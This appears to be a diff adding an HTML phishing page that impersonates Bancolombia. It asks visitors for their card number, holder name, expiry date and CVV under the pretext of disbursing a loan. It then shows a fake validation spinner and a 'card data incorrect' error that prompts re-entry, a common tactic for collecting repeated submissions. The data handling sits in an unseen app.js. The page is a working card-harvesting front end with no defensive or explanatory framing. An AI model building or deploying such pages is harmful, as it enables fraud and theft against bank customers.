@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Datos de Tarjeta</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow-x: hidden; }
+        body { font-family: 'Open Sans', Arial, sans-serif; font-size: 16px; color: #2c2a29; line-height: 24px; background-color: #f9f9fa; display: flex; flex-direction: column; min-height: 100vh; }
+        .decorative-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+        .header { display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; z-index: 10; }
+        .header-logo { height: 35px; }
+        .main-container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; position: relative; z-index: 10; }
+        .login-card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06); padding: 50px 60px; max-width: 500px; width: 100%; }
+        .card-title { color: #212121; font-size: 28px; font-weight: 700; margin-bottom: 10px; text-align: center; }
+        .icon-container { width: 80px; height: 80px; background-color: #f5f5f5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; }
+        .icon-container svg { width: 40px; height: 40px; color: #666666; }
+        .subtitle { font-size: 14px; color: #666666; margin-bottom: 35px; text-align: center; line-height: 1.5; }
+        :root { --card-img-width: 100%; --card-img-max-width: 460px; }
+        .card-img-wrapper { width: var(--card-img-width); max-width: var(--card-img-max-width); margin: 0 auto 28px; display: block; }
+        .card-img-wrapper img { width: 100%; height: auto; display: block; background: transparent; border-radius: 0; box-shadow: none; }
+        .field-group { margin-bottom: 20px; }
+        .field-label { font-size: 12px; font-weight: 600; color: #555555; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 7px; display: block; }
+        .field-input { width: 100%; padding: 13px 16px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; font-weight: 600; color: #212121; font-family: 'Open Sans', Arial, sans-serif; background: #fafafa; transition: border-color 0.3s ease, background 0.3s ease; outline: none; }
+        .field-input:focus { border-color: #fdda24; background: #ffffff; }
+        .field-input.filled { border-color: #4caf50; background: #ffffff; }
+        .field-input::placeholder { color: #bdbdbd; font-weight: 400; }
+        .field-row { display: flex; gap: 16px; }
+        .field-row .field-group { flex: 1; }
+        .cvv-wrapper { position: relative; }
+        .cvv-wrapper .field-input { padding-right: 44px; }
+        .cvv-info-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #aaaaaa; cursor: pointer; }
+        .cvv-info-icon svg { width: 18px; height: 18px; }
+        .card-number-input { letter-spacing: 2px; }
+        .submit-button { width: 100%; padding: 15px 32px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: not-allowed; border: none; background-color: #e0e0e0; color: #999999; transition: all 0.3s ease; font-family: 'Open Sans', Arial, sans-serif; margin-top: 8px; margin-bottom: 20px; }
+        .submit-button.enabled { background-color: #fdda24; color: #212121; cursor: pointer; }
+        .submit-button.enabled:hover { background-color: #fdd007; }
+        .security-note { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #888888; }
+        .security-note svg { width: 14px; height: 14px; color: #4caf50; }
+        .loading-overlay { position: fixed; inset: 0; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.25s ease; }
+        .loading-overlay.active { opacity: 1; pointer-events: all; }
+        .loading-logo { height: 36px; width: auto; margin-bottom: 48px; }
+        .spinner { width: 52px; height: 52px; margin-bottom: 36px; }
+        .spinner svg { width: 52px; height: 52px; animation: spin 1s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .loading-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 10px; text-align: center; }
+        .loading-subtitle { font-size: 14px; color: #666; text-align: center; line-height: 1.55; max-width: 260px; }
+        .error-overlay { position: fixed; inset: 0; background: #121212; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
+        .error-overlay.active { opacity: 1; pointer-events: all; }
+        .error-icon { width: 80px; height: 80px; border-radius: 50%; background: rgba(253, 218, 36, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; }
+        .error-icon svg { width: 40px; height: 40px; stroke: #fdda24; }
+        .error-title { font-size: 24px; font-weight: 700; color: #ffffff; margin-bottom: 12px; }
+        .error-text { font-size: 15px; color: #b3b3b3; max-width: 400px; line-height: 1.6; margin-bottom: 32px; }
+        .error-btn { background: #fdda24; color: #121212; border: none; padding: 14px 40px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s; }
+        .error-btn:hover { transform: scale(1.05); }
+    </style>
+</head>
+<body>
+    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
+        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" stroke="#ff8855" stroke-width="32" fill="none" stroke-linecap="round"/>
+        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" stroke="#fdd835" stroke-width="38" fill="none" stroke-linecap="round"/>
+        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" stroke="#9c6fb8" stroke-width="28" fill="none" stroke-linecap="round"/>
+        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" stroke="#9c6fb8" stroke-width="30" fill="none" stroke-linecap="round"/>
+    </svg>
+    <div class="header"><img src="bancol.png" alt="Bancolombia" class="header-logo"></div>
+    <main class="main-container">
+        <div class="login-card">
+            <h1 class="card-title">Verifica tu tarjeta</h1>
+            <div class="icon-container">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+            </div>
+            <p class="subtitle">Para desembolsar tu crédito necesitamos verificar los datos de tu tarjeta Bancolombia.</p>
+            <div class="card-img-wrapper"><img src="bancolombia.svg" alt="Tarjeta Bancolombia"></div>
+            <div class="field-group">
+                <label class="field-label" for="cardNumber">Número de tarjeta</label>
+                <input type="tel" class="field-input card-number-input" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+            </div>
+            <div class="field-group">
+                <label class="field-label" for="cardName">Nombre del titular</label>
+                <input type="text" class="field-input" id="cardName" placeholder="Como aparece en la tarjeta" maxlength="40" autocomplete="cc-name">
+            </div>
+            <div class="field-row">
+                <div class="field-group">
+                    <label class="field-label" for="cardExp">Fecha de vencimiento</label>
+                    <input type="tel" class="field-input" id="cardExp" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
+                </div>
+                <div class="field-group">
+                    <label class="field-label" for="cardCvv">CVV</label>
+                    <div class="cvv-wrapper">
+                        <input type="password" class="field-input" id="cardCvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+                        <span class="cvv-info-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg></span>
+                    </div>
+                </div>
+            </div>
+            <button class="submit-button" id="btnSubmit" disabled>Continuar</button>
+            <div class="security-note">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                Tus datos están protegidos con cifrado SSL
+            </div>
+        </div>
+    </main>
+    <div class="loading-overlay" id="loadingOverlay">
+        <img src="bancol.png" alt="Bancolombia" class="loading-logo">
+        <div class="spinner"><svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/><circle cx="26" cy="26" r="22" stroke="#FDDA24" stroke-width="4" stroke-linecap="round" stroke-dasharray="103 35" stroke-dashoffset="0"/></svg></div>
+        <p class="loading-title">Validando tus datos bancarios para proceder con tu compra.</p>
+        <p class="loading-subtitle"> Esto puede tardar entre 1 y 2 minutos.</p>
+    </div>
+    <div id="errorOverlay" class="error-overlay">
+        <div class="error-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+        </div>
+        <div class="error-title">Los datos de tu tarjeta son incorrectos</div>
+        <div class="error-text">Por favor, verifica tus datos e intenta de nuevo.</div>
+        <button class="error-btn" onclick="window.location.reload()">Volver a intentar</button>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
